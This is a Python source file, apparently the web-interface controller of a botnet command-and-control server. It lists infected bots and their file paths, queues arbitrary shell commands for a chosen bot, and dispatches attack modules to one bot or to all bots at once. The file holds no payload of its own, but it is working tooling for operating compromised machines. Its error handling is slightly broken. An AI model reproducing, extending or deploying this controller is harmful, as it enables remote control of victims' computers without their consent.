from threading import Thread
from server import modules
from server.model import Command, CommandType

class webgui():
    def __init__(self,model):
        self._model = model
    
    def get_module_list(self):
        """
        gets module list
        """
        modulesList = []
        for module_name in modules.get_names():
            try:
                module = modules.get_module(module_name)
                if not module:
                    module = modules.load_module(module_name,self._model)
                modulesList.append([module_name,module])
            except AttributeError as ex:
                print(ex)
        return modulesList
    
    def selectedModulesOpt(self,module_name):
        """
        returns the module setup messages
        """
        module = modules.get_module(module_name)
        if not module:
            module = modules.load_module(module_name,self._model)
        info = module.get_setup_messages()
        return info

    def shellCommand(self,command,bot_id):
        """
        function to insert or run shell commands
        """
        self._model.add_command(bot_id, Command(CommandType.SHELL, command.encode()))
        return 200

    
    def botlist(self):
         """
         returns the botliist for website
         """
         bots = self._model.get_bots()
         return bots
    
    def botpath(self,bot_id):
        """
        returns the current path stored in the database
        """
        bot = self._model.get_bot(bot_id)
        return bot.local_path


    
    def command(self,command,bot_uid):
        self._model.add_command(bot_uid,Command(CommandType.SHELL, command.encode()))
    
    def runModule(self,module_name,set_options,bot_uid):
         module_thread = Thread(target=self._run_module, args=(module_name,set_options,bot_uid))
         module_thread.daemon = True
         module_thread.start()


    def _run_module(self, module_name,set_options,bot_uid, mass_execute=False):
        """Setup then run the module, required because otherwise calls to prompt block the main thread."""
        try:
            module = modules.get_module(module_name)
            code = ("", b"")
            if not module:
                module = modules.load_module(module_name, self._model)

            successful, options = module.setup(set_options)
            if not successful:
                 return "Module setup failed or cancelled.", "attention"
            else:
                if not options:
                    options = {}

                options["module_name"] = module_name
            if mass_execute:
                bots = self._model.get_bots()

                for bot in bots:
                    if module_name == "remove_bot":
                        if code[0] != bot.loader_name:
                            pass
                            # code = (bot.loader_name, loaders.get_remove_code(bot.loader_name))
                    elif module_name == "update_bot":
                        pass
                        # if code[0] != bot.loader_name:
                        #     code = (bot.loader_name, loaders.get_update_code(bot.loader_name))
                    else:
                        if not code[0]:
                            code = ("", modules.get_code(module_name))

                    self._model.add_command(bot.uid, Command(
                        CommandType.MODULE, code[1], options
                    ))

                return "Module added to the queue of {} bot(s).".format(len(bots)), "info"
            else:
                if module_name == "remove_bot":
                    pass
                    # code = loaders.get_remove_code(self._connected_bot.loader_name)
                elif module_name == "update_bot":
                    pass
                    # code = loaders.get_update_code(self._connected_bot.loader_name)
                else:
                    code = modules.get_code(module_name)
                    print(code)

                self._model.add_command(bot_uid, Command(
                    CommandType.MODULE, code, options
                ))

                return ("Module added to the queue")
        except ImportError:
            res = ""
            res += "Failed to find module: {}".format(module_name), "attention"
            res += "Type \"modules\" to get a list of available modules.", "attention"
            return res
    
    def getPostKeyName(self,module_name):
        module = modules.get_module(module_name)
        if not module:
            module = modules.load_module(module_name,self._model)
        infos = module.get_setup_messages()
        keys = []
        for info in infos:
            keys.append(info[1])
        return keys
